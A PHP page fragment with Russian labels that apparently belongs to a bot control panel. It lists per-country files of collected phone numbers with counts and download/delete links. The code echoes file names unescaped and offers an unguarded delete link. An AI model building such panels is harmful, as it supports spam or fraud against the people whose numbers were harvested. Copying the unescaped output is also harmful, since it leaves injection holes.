
<div class="content" style="padding-top:15px;">
<table align="center" class="header_table_commands table_dark" border="1" cellspacing="0" cellpadding="0" width=100%>
	<thead class="header_table_commands">	
		<th>Страна</th>
		<th>Количество номеров</th>	
		<th>Скачать/Удалить</th>
	</thead>
	
<?php
$svoy=getcwd();
$godir="/private/numers";

$dir = "$svoy$godir";
$files2 = scandir($dir, 1);
echo "<p id='text_command'> База номеров</p>";
foreach($files2 as $fil)
{
	if (preg_match("/.html/",$fil))
	{
		$nameF = str_replace(".html","","$fil");
		$path = "private/numers/";
		$count = lines("private/numers/$fil");
		$nameF_icon=str_replace("{","",$nameF);
		$nameF_icon=str_replace("}","",$nameF_icon);
		
		if (!file_exists("images/country/$nameF_icon.png")) {
			$nameF_icon="not";
		}
		
		echo "<tr class='table_bots' style='color: #A4A4A4'>
				<td><a title='$nameF'><img src='images/country/$nameF_icon.png' width='20px'/></a></td>
				<td>$count</td>
				<td><a href='$path$fil' download>Скачать</a> / <a href='private/del_file.php?t=nums&f=$nameF'>Удалить</a></td>
				</tr>";
	}
}

function lines($file) 
{ 
    if(!file_exists($file))exit("Файл не найден"); 
    $file_arr = file($file); 
    $lines = count($file_arr); 
    return $lines; 
} 
?>
</div>